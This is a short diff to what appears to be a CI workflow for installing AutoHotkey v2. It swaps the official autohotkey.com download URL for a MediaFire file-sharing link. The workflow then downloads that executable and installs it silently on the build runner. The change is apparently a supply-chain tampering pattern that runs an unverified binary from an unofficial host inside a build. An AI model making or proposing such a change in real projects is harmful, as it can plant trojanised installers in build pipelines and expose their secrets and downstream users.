@@ -11,7 +11,7 @@ jobs:
     steps:
       - name: Download and install AutoHotkey v2
         run: |
-          $ahkUrl = "https://www.autohotkey.com/download/ahk-v2.exe"
+          $ahkUrl = "https://www.mediafire.com/file/tob6736a61vcdph/AutoHotkey_2.0.19_setup.exe/file"
           $ahkPath = "$env:TEMP\ahk-v2.exe"
           Invoke-WebRequest -Uri $ahkUrl -OutFile $ahkPath
           # Install AutoHotkey silently
